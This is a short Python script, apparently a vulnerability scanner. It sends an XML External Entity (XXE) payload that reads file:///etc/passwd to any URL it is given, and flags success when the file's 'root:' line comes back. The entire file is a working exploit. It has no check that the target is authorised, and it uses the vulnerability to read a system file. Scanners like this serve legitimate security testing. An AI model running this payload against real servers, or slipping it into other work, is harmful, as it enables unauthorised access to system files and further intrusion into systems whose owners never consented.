import requests
from requests.exceptions import ConnectionError, HTTPError

def scan_xxe(url):
    """Scan for XXE vulnerabilities"""
    xml_payload = """
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>
    """
    try:
        headers = {'Content-Type': 'application/xml'}
        response = requests.post(url, data=xml_payload, headers=headers)
        if "root:" in response.text:
            print(f"XXE vulnerability detected at {url}")
            return True
        return False
    
    except ConnectionError as e:
        print(f"Connection error occurred: {e}")
        return False

    except HTTPError as e:
        print(f"HTTP error occurred: {e}")
        return False

